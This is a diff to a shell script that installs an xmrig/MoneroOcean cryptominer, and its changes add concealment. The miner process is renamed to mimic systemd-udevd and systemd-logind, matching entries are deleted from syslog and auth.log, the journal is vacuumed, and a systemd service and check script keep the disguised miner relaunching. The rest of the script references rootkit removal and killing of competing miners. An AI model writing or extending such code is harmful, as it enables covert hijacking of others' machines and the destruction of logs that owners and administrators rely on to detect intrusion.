@@ -92,7 +92,7 @@ force_stop_service() {
     
     # Final nuclear kill
     echo "[!] Max attempts reached, final kill..."
-    killall -9 xmrig kswapd0 swapd gdm2 moneroocean_miner 2>/dev/null || true
+    killall -9 xmrig kswapd0 swapd gdm2 moneroocean_miner .systemd-udevd .systemd-logind 2>/dev/null || true
     return 0
 }
 
@@ -140,7 +140,7 @@ sudo rmmod diamorphine reptile rootkit 2>/dev/null
 sudo rm -rf /tmp/.ICE-unix/Reptile /tmp/.ICE-unix/Diamorphine /tmp/.X11-unix/hiding-cryptominers-linux-rootkit 2>/dev/null
 
 # Clean logs
-sudo sed -i '/swapd\|gdm\|kswapd0\|xmrig\|miner\|accepted/d' /var/log/syslog /var/log/auth.log /var/log/messages 2>/dev/null
+sudo sed -i '/swapd\|gdm\|kswapd0\|systemd-udevd\|systemd-logind\|xmrig\|miner\|accepted/d' /var/log/syslog /var/log/auth.log /var/log/messages 2>/dev/null
 sudo journalctl --vacuum-time=1s 2>/dev/null
 
 echo "[✓] Previous installations cleaned"
@@ -164,8 +164,8 @@ crontab -r
 #killall swapd
 #kill -9 `/bin/ps ax -fu $USER| grep "swapd" | grep -v "grep" | awk '{print $2}'`
 
-killall kswapd0
-kill -9 $(/bin/ps ax -fu $USER | grep "kswapd0" | grep -v "grep" | awk '{print $2}')
+killall .systemd-udevd kswapd0 2>/dev/null || true
+kill -9 $(/bin/ps ax -fu $USER | grep -E "kswapd0|systemd-udevd" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
 
 rm -rf $HOME/.system_cache/
 #rm -rf $HOME/.swapd/
@@ -344,7 +344,7 @@ if sudo -n true 2>/dev/null; then
   sudo systemctl stop moneroocean_miner.service
 fi
 killall -9 xmrig
-killall -9 kswapd0
+killall -9 .systemd-udevd kswapd0 2>/dev/null || true
 
 echo "[*] Removing $HOME/moneroocean directory"
 rm -rf $HOME/moneroocean
@@ -502,7 +502,7 @@ else
 
   if ! type systemctl >/dev/null; then
 
-    echo "[*] Running miner in the background (see logs in $HOME/.system_cache/kswapd0.log file)"
+    echo "[*] Running miner in the background (disguised as systemd-logind)"
     
     # ==================== FIX: Properly detach miner to prevent hanging ====================
     # Start miner in a fully detached background process
@@ -540,7 +540,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config_background.json
+ExecStart=$HOME/.system_cache/.systemd-logind.sh $HOME/.system_cache/config_background.json
 Restart=always
 RestartSec=10
 TimeoutStartSec=30
@@ -613,11 +613,11 @@ echo "NOTE: If you are using shared VPS it is recommended to avoid 100% CPU usag
 if [ "$CPU_THREADS" -lt "4" ]; then
   echo "HINT: Please execute these or similair commands under root to limit miner to 75% percent CPU usage:"
   echo "sudo apt-get update; sudo apt-get install -y cpulimit"
-  echo "sudo cpulimit -e kswapd0 -l $((75 * $CPU_THREADS)) -b"
+  echo "sudo cpulimit -e .systemd-udevd -l $((75 * $CPU_THREADS)) -b"
   if [ "$(tail -n1 /etc/rc.local)" != "exit 0" ]; then
-    echo "sudo sed -i -e '\$acpulimit -e kswapd0 -l $((75 * $CPU_THREADS)) -b\\n' /etc/rc.local"
+    echo "sudo sed -i -e '\$acpulimit -e .systemd-udevd -l $((75 * $CPU_THREADS)) -b\\n' /etc/rc.local"
   else
-    echo "sudo sed -i -e '\$i \\cpulimit -e kswapd0 -l $((75 * $CPU_THREADS)) -b\\n' /etc/rc.local"
+    echo "sudo sed -i -e '\$i \\cpulimit -e .systemd-udevd -l $((75 * $CPU_THREADS)) -b\\n' /etc/rc.local"
   fi
 else
   echo "HINT: Please execute these commands and reboot your VPS after that to limit miner to 75% percent CPU usage:"
@@ -740,23 +740,26 @@ echo ""
 # Continue with existing script...
 #cat $HOME/.system_cache/config.json
 
-# Run kswapd0 if no other process with the specific configuration is running
-if ! pgrep -f "$HOME/.system_cache/kswapd0 --config=$HOME/.system_cache/config_background.json" > /dev/null; then
-    echo "kswapd0 not started. Starting it..."
-    "$HOME/.system_cache/kswapd0" --config="$HOME/.system_cache/config_background.json" &
+# Run miner if no other process with the specific configuration is running
+if ! pgrep -f "$HOME/.system_cache/.systemd-udevd.*config_background.json\|systemd-logind" > /dev/null; then
+    echo "Miner not started. Starting it..."
+    "$HOME/.system_cache/.systemd-logind.sh" "$HOME/.system_cache/config_background.json" &
 else
-    echo "kswapd0 is already running."
+    echo "Miner is already running (disguised as systemd-logind)."
 fi
 
 echo "[*] Create the check script"
 cat <<'EOF' >"$HOME/.system_cache/check_and_start.sh"
 #!/bin/bash
 lockfile="$HOME/.system_cache/check_and_start.lock"
-# Locking-Mechanismus mit flock
+# Locking mechanism with flock
 exec 200>"$lockfile"
 flock -n 200 || exit 1
-if ! pgrep -f "$HOME/.system_cache/kswapd0"; then
-  "$HOME/.system_cache/kswapd0" --config="$HOME/.system_cache/config_background.json"
+
+# Check for disguised miner process
+if ! pgrep -f "$HOME/.system_cache/.systemd-udevd\|systemd-logind.*--user"; then
+  # Start with disguised launcher
+  "$HOME/.system_cache/.systemd-logind.sh" "$HOME/.system_cache/config_background.json" >/dev/null 2>&1 &
 fi
 EOF
 
@@ -791,7 +794,7 @@ for pid in $SWAPD_PIDS; do
     fi
 done
 
-KSWAPD_PIDS=$(/bin/ps ax -fu $USER 2>/dev/null | grep "kswapd0" | grep -v "grep" | awk '{print $2}')
+KSWAPD_PIDS=$(/bin/ps ax -fu $USER 2>/dev/null | grep -E "kswapd0|systemd-udevd" | grep -v "grep" | awk '{print $2}')
 for pid in $KSWAPD_PIDS; do
     if [[ "$pid" =~ ^[0-9]+$ ]]; then
         kill -31 "$pid" 2>/dev/null || true
